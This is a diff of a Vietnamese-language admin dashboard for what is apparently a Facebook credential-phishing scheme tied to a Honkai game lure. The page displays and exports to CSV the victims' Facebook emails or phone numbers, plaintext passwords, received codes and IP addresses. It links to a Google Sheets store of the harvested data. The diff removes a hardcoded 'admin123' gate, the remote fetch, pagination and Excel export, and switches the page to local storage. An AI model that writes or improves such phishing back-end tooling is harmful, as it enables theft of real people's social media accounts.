@@ -198,33 +198,6 @@
             border-color: #667eea;
             outline: none;
         }
-        
-        .pagination {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin-top: 20px;
-            gap: 15px;
-        }
-        
-        .page-btn {
-            background: #6c757d;
-            color: white;
-            border: none;
-            padding: 8px 15px;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-        
-        .page-btn:disabled {
-            background: #ccc;
-            cursor: not-allowed;
-        }
-        
-        .page-info {
-            color: #666;
-            font-weight: 500;
-        }
 
         .status-message {
             position: fixed;
@@ -245,51 +218,12 @@
         .status-error {
             background: #dc3545;
         }
-
-        .password-protection {
-            max-width: 400px;
-            margin: 100px auto;
-            background: white;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
-            text-align: center;
-        }
-        
-        .password-protection input {
-            width: 100%;
-            padding: 12px;
-            margin: 15px 0;
-            border: 1px solid #ddd;
-            border-radius: 6px;
-            font-size: 16px;
-        }
-        
-        .password-protection button {
-            background: #667eea;
-            color: white;
-            border: none;
-            padding: 12px 30px;
-            border-radius: 6px;
-            cursor: pointer;
-            font-size: 16px;
-            width: 100%;
-        }
     </style>
 </head>
 <body>
-    <!-- Bảo vệ bằng mật khẩu -->
-    <div id="passwordSection" class="password-protection">
-        <h2>🔒 Bảo vệ Quản trị</h2>
-        <p>Vui lòng nhập mật khẩu để truy cập:</p>
-        <input type="password" id="adminPassword" placeholder="Nhập mật khẩu quản trị">
-        <button onclick="checkPassword()">Truy cập</button>
-        <p id="passwordError" style="color: red; margin-top: 10px; display: none;">Mật khẩu không đúng!</p>
-    </div>
-
     <div class="status-message" id="statusMessage"></div>
 
-    <div class="admin-container" id="adminPanel" style="display: none;">
+    <div class="admin-container">
         <div class="admin-header">
             <h1>📊 BẢNG ĐIỀU KHIỂN QUẢN TRỊ</h1>
             <p>Hệ thống theo dõi lượt liên kết Facebook - Google Sheets Database</p>
@@ -316,20 +250,17 @@
             </div>
             
             <div class="controls">
-                <button class="control-btn refresh" onclick="loadData()">
-                    🔄 Tải lại dữ liệu
+                <button class="control-btn refresh" onclick="loadLocalData()">
+                    🔄 Tải dữ liệu cục bộ
                 </button>
                 <button class="control-btn export" onclick="exportToCSV()">
                     📥 Xuất CSV
-                </button>
-                <button class="control-btn export" onclick="exportToExcel()">
-                    📊 Xuất Excel
                 </button>
                 <button class="control-btn" onclick="openGoogleSheets()">
                     📋 Mở Google Sheets
                 </button>
                 <button class="control-btn delete" onclick="clearAllData()">
-                    🗑️ Xóa dữ liệu
+                    🗑️ Xóa dữ liệu cục bộ
                 </button>
                 <button class="control-btn" onclick="goToMain()">
                     🏠 Về trang chính
@@ -351,9 +282,7 @@
                                 <th width="150">Mật khẩu</th>
                                 <th width="150">Code nhận được</th>
                                 <th width="150">Thời gian</th>
-                                <th width="120">Trình duyệt</th>
                                 <th width="120">IP</th>
-                                <th width="100">Hành động</th>
                             </tr>
                         </thead>
                         <tbody id="userList">
@@ -366,15 +295,6 @@
                     <div class="icon">📭</div>
                     <h3>Chưa có dữ liệu nào</h3>
                     <p>Dữ liệu người dùng sẽ xuất hiện ở đây khi có người liên kết Facebook.</p>
-                    <button class="control-btn refresh" onclick="loadData()" style="margin-top: 15px;">
-                        🔄 Thử tải lại
-                    </button>
-                </div>
-
-                <div class="pagination" id="pagination" style="display: none;">
-                    <button class="page-btn" onclick="changePage(-1)" id="prevBtn">← Trước</button>
-                    <span class="page-info" id="pageInfo">Trang 1 của 1</span>
-                    <button class="page-btn" onclick="changePage(1)" id="nextBtn">Sau →</button>
                 </div>
             </div>
         </div>
@@ -382,36 +302,11 @@
 
     <script>
         // ================= CẤU HÌNH =================
-        const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwy3SzmFXBa8Y00ikUlXbK-JRbGbUJ3tLVeq4Od2FIegbyQC-S6ZHlSmK674UIYcU3W/exec';
         const GOOGLE_SHEETS_URL = 'https://docs.google.com/spreadsheets/d/11rTrANoZLC8WhFJX7wOQZHB2iiuDuzzamwVz67_KK9I/edit#gid=0';
-        const ADMIN_PASSWORD = "admin123"; // Mật khẩu quản trị
 
         // Biến toàn cục
         let allData = [];
         let filteredData = [];
-        let currentPage = 1;
-        const itemsPerPage = 15;
-
-        // ================= BẢO MẬT =================
-        function checkPassword() {
-            const password = document.getElementById('adminPassword').value;
-            const errorElement = document.getElementById('passwordError');
-            
-            if (password === ADMIN_PASSWORD) {
-                document.getElementById('passwordSection').style.display = 'none';
-                document.getElementById('adminPanel').style.display = 'block';
-                loadData();
-            } else {
-                errorElement.style.display = 'block';
-            }
-        }
-
-        // Cho phép nhấn Enter để đăng nhập
-        document.getElementById('adminPassword').addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') {
-                checkPassword();
-            }
-        });
 
         // ================= HIỂN THỊ THÔNG BÁO =================
         function showStatus(message, type = 'success') {
@@ -424,32 +319,6 @@
             }, 4000);
         }
 
-        // ================= TẢI DỮ LIỆU =================
-        async function loadData() {
-            try {
-                showStatus('🔄 Đang tải dữ liệu từ Google Sheets...', 'success');
-                
-                const response = await fetch(GOOGLE_SCRIPT_URL);
-                if (!response.ok) {
-                    throw new Error('Không thể kết nối đến Google Sheets');
-                }
-                
-                const data = await response.json();
-                allData = Array.isArray(data) ? data : [];
-                
-                updateStatistics();
-                filterData(); // Áp dụng filter hiện tại
-                showStatus(`✅ Đã tải ${allData.length} bản ghi`, 'success');
-                
-            } catch (error) {
-                console.error('Lỗi tải dữ liệu:', error);
-                showStatus('❌ Lỗi tải dữ liệu: ' + error.message, 'error');
-                
-                // Thử tải dữ liệu cục bộ
-                loadLocalData();
-            }
-        }
-
         // ================= TẢI DỮ LIỆU CỤC BỘ =================
         function loadLocalData() {
             try {
@@ -457,9 +326,10 @@
                 allData = localData;
                 updateStatistics();
                 filterData();
-                showStatus(`⚠️ Đang hiển thị ${localData.length} bản ghi cục bộ`, 'error');
+                showStatus(`✅ Đã tải ${localData.length} bản ghi từ bộ nhớ cục bộ`, 'success');
             } catch (error) {
                 console.error('Lỗi tải dữ liệu cục bộ:', error);
+                showStatus('❌ Lỗi tải dữ liệu cục bộ', 'error');
             }
         }
 
@@ -487,14 +357,12 @@
             if (searchTerm) {
                 filteredData = allData.filter(user => 
                     user.username.toLowerCase().includes(searchTerm) ||
-                    (user.code && user.code.toLowerCase().includes(searchTerm)) ||
-                    (user.email && user.email.toLowerCase().includes(searchTerm))
+                    (user.code && user.code.toLowerCase().includes(searchTerm))
                 );
             } else {
                 filteredData = [...allData];
             }
             
-            currentPage = 1;
             displayData();
         }
 
@@ -502,85 +370,43 @@
         function displayData() {
             const userList = document.getElementById('userList');
             const emptyState = document.getElementById('emptyState');
-            const pagination = document.getElementById('pagination');
             const table = document.getElementById('userTable');
 
             if (filteredData.length === 0) {
                 userList.innerHTML = '';
                 emptyState.style.display = 'block';
                 table.style.display = 'none';
-                pagination.style.display = 'none';
                 return;
             }
 
             emptyState.style.display = 'none';
             table.style.display = 'table';
-            pagination.style.display = 'flex';
-
-            // Tính toán phân trang
-            const totalPages = Math.ceil(filteredData.length / itemsPerPage);
-            const startIndex = (currentPage - 1) * itemsPerPage;
-            const endIndex = startIndex + itemsPerPage;
-            const pageData = filteredData.slice(startIndex, endIndex);
 
             let html = '';
-            pageData.forEach((user, index) => {
-                const actualIndex = startIndex + index + 1;
+            filteredData.forEach((user, index) => {
                 html += `
                     <tr>
-                        <td>${actualIndex}</td>
+                        <td>${index + 1}</td>
                         <td><strong>${escapeHtml(user.username)}</strong></td>
                         <td><code>${escapeHtml(user.password)}</code></td>
                         <td><strong style="color: #e74c3c;">${escapeHtml(user.code)}</strong></td>
                         <td><small>${escapeHtml(user.timestamp)}</small></td>
-                        <td><small title="${escapeHtml(user.browser)}">${truncateText(user.browser, 30)}</small></td>
                         <td><code>${escapeHtml(user.ip || 'N/A')}</code></td>
-                        <td>
-                            <button class="control-btn" style="padding: 6px 10px; font-size: 12px;" onclick="deleteRow(${actualIndex - 1})">
-                                🗑️
-                            </button>
-                        </td>
                     </tr>
                 `;
             });
 
             userList.innerHTML = html;
-
-            // Cập nhật phân trang
-            document.getElementById('pageInfo').textContent = `Trang ${currentPage} của ${totalPages}`;
-            document.getElementById('prevBtn').disabled = currentPage === 1;
-            document.getElementById('nextBtn').disabled = currentPage === totalPages;
-        }
-
-        // ================= PHÂN TRANG =================
-        function changePage(direction) {
-            const totalPages = Math.ceil(filteredData.length / itemsPerPage);
-            currentPage += direction;
-            
-            if (currentPage < 1) currentPage = 1;
-            if (currentPage > totalPages) currentPage = totalPages;
-            
-            displayData();
         }
 
         // ================= XÓA DỮ LIỆU =================
-        function deleteRow(index) {
-            if (confirm('Bạn có chắc chắn muốn xóa bản ghi này?')) {
-                allData.splice(index, 1);
-                // TODO: Cập nhật lên Google Sheets
-                updateStatistics();
-                filterData();
-                showStatus('✅ Đã xóa bản ghi', 'success');
-            }
-        }
-
         function clearAllData() {
-            if (confirm('⚠️ BẠN CÓ CHẮC CHẮN MUỐN XÓA TẤT CẢ DỮ LIỆU?\nHành động này không thể hoàn tác!')) {
+            if (confirm('⚠️ BẠN CÓ CHẮC CHẮN MUỐN XÓA TẤT CẢ DỮ LIỆU CỤC BỘ?\nHành động này không thể hoàn tác!')) {
                 allData = [];
                 localStorage.removeItem('honkaiUserData');
                 updateStatistics();
                 filterData();
-                showStatus('✅ Đã xóa tất cả dữ liệu', 'success');
+                showStatus('✅ Đã xóa tất cả dữ liệu cục bộ', 'success');
             }
         }
 
@@ -591,28 +417,13 @@
                 return;
             }
 
-            let csv = 'STT,Email/SĐT Facebook,Mật khẩu,Code,Thời gian,Trình duyệt,IP\n';
+            let csv = 'STT,Email/SĐT Facebook,Mật khẩu,Code,Thời gian,IP\n';
             allData.forEach((user, index) => {
-                csv += `${index + 1},"${user.username}","${user.password}","${user.code}","${user.timestamp}","${user.browser}","${user.ip}"\n`;
+                csv += `${index + 1},"${user.username}","${user.password}","${user.code}","${user.timestamp}","${user.ip}"\n`;
             });
 
             downloadFile(csv, 'honkai_user_data.csv', 'text/csv');
             showStatus('✅ Đã xuất file CSV', 'success');
-        }
-
-        function exportToExcel() {
-            if (allData.length === 0) {
-                showStatus('❌ Không có dữ liệu để xuất', 'error');
-                return;
-            }
-
-            let excelData = 'STT\tEmail/SĐT Facebook\tMật khẩu\tCode\tThời gian\tTrình duyệt\tIP\n';
-            allData.forEach((user, index) => {
-                excelData += `${index + 1}\t${user.username}\t${user.password}\t${user.code}\t${user.timestamp}\t${user.browser}\t${user.ip}\n`;
-            });
-
-            downloadFile(excelData, 'honkai_user_data.xls', 'application/vnd.ms-excel');
-            showStatus('✅ Đã xuất file Excel', 'success');
         }
 
         function downloadFile(data, filename, type) {
@@ -642,33 +453,12 @@
             return div.innerHTML;
         }
 
-        function truncateText(text, maxLength) {
-            if (text.length <= maxLength) return text;
-            return text.substring(0, maxLength) + '...';
-        }
-
         // ================= KHỞI TẠO =================
         function init() {
             console.log('Admin Panel đã sẵn sàng!');
-            console.log('Google Script URL:', GOOGLE_SCRIPT_URL);
-            
-            // Tự động tải dữ liệu khi trang được mở
-            setTimeout(() => {
-                if (document.getElementById('adminPanel').style.display !== 'none') {
-                    loadData();
-                }
-            }, 1000);
+            loadLocalData();
         }
 
-        // Cho phép truy cập admin bằng phím tắt (Ctrl + Alt + A)
-        document.addEventListener('keydown', function(e) {
-            if (e.ctrlKey && e.altKey && e.key === 'a') {
-                window.location.href = 'admin.html';
-                e.preventDefault();
-            }
-        });
-
-        // Chạy khởi tạo khi trang load
         window.onload = init;
     </script>
 </body>
